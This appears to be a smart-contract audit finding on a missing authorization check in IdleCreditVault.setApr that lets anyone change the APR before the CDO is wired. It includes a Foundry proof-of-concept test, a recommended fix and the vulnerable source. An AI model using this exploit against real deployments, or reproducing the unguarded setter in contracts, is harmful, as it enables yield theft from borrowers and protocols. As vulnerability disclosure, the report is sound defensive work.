### Title
Unauthenticated APR manipulation before CDO wiring permits lender yield theft - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr` enforces the CDO-or-manager caller check only after `idleCDO` has been configured. During the initialization window, any unprivileged account can replace the configured APR before `setWhitelistedCDO` wires the strategy to the credit vault. [1](#0-0) 

### Finding Description
`initialize` stores the intended APR in `lastApr` and `unscaledApr`. [2](#0-1)  However, while `idleCDO == address(0)`, `setApr`, `setAprs`, and `setAprsWithBuffer` are callable by anyone because the authorization check is skipped entirely. [3](#0-2) 

This affects non-factory/manual deployments where strategy initialization and CDO wiring are separate transactions. The factory path configures APR and wires the CDO atomically, so the vulnerable window is not externally reachable through `deployCreditVault`. [4](#0-3) 

After wiring, `IdleCDOEpochVariant` uses the strategy APR to calculate epoch interest and withdrawal-request interest. [5](#0-4)  An attacker lender can maximize the APR, hold tranches during the epoch, and receive inflated withdrawal receipts funded by the borrower. [6](#0-5) 

### Impact Explanation
An unprivileged lender can increase `unscaledApr` and `lastApr` up to `DEFAULT_MAX_APR`, causing withdrawal receipts and expected borrower payments to be priced at an unauthorized rate. [7](#0-6)  If the intended APR is 10% and the attacker sets 20%, approximately 10% annualized interest is improperly added to eligible balances and withdrawal claims. The borrower is charged the inflated amount; if repayment is insufficient, the normal default path can crystallize a protocol loss rather than the attacker's excess claim. [8](#0-7) 

### Likelihood Explanation
Likelihood is deployment-configuration dependent. It requires a strategy proxy to remain initialized with `idleCDO == address(0)` for at least one attacker transaction, followed by owner wiring and pool funding without correcting the APR. The bundled factory deployment does not expose that window because configuration and wiring occur in one transaction. [4](#0-3) 

### Recommendation
Require `msg.sender == owner()` whenever `idleCDO == address(0)`, rather than skipping authorization. For example:

```solidity
address _cdo = idleCDO;
if (_cdo == address(0)) {
    if (msg.sender != owner()) revert NotAllowed();
} else if (msg.sender != _cdo && msg.sender != manager) {
    revert NotAllowed();
}
```

Also add a regression test proving that a non-owner cannot call `setApr`, `setAprs`, or `setAprsWithBuffer` before `setWhitelistedCDO`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from
    "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IdleCreditVault} from
    "../contracts/strategies/idle/IdleCreditVault.sol";

contract MissingAprAuthorizationPoC is Test {
    function testUnauthorizedAprChangeBeforeCdoWiring() external {
        address owner = makeAddr("owner");
        address manager = makeAddr("manager");
        address borrower = makeAddr("borrower");
        address cdo = makeAddr("cdo");
        address attacker = makeAddr("attacker");
        address underlying = makeAddr("underlying");

        // Minimal ERC20 surface needed by initialize().
        vm.mockCall(
            underlying,
            abi.encodeWithSignature("decimals()"),
            abi.encode(uint8(18))
        );

        IdleCreditVault implementation = new IdleCreditVault();
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
            address(implementation),
            address(this),
            abi.encodeWithSelector(
                IdleCreditVault.initialize.selector,
                underlying,
                owner,
                manager,
                borrower,
                "Borrower",
                10e18 // intended unscaled APR
            )
        );
        IdleCreditVault strategy = IdleCreditVault(address(proxy));

        assertEq(strategy.idleCDO(), address(0));
        assertEq(strategy.lastApr(), 10e18);

        // Unauthorized caller replaces the configured APR while idleCDO is unset.
        vm.prank(attacker);
        strategy.setAprs(20e18, 20e18);

        assertEq(strategy.unscaledApr(), 20e18);
        assertEq(strategy.lastApr(), 20e18);

        // Owner later wires the CDO without noticing the changed APR.
        vm.prank(owner);
        strategy.setWhitelistedCDO(cdo);

        // The unauthorized configuration is now protected by CDO wiring, but remains active.
        vm.prank(attacker);
        vm.expectRevert();
        strategy.setApr(10e18);

        assertEq(strategy.unscaledApr(), 20e18);
        assertEq(strategy.lastApr(), 20e18);
    }
}
```

  /// @notice set both the unscaled APR and APR scaled by epoch plus buffer duration.
  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }

  /// @notice set the fixed apr
  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
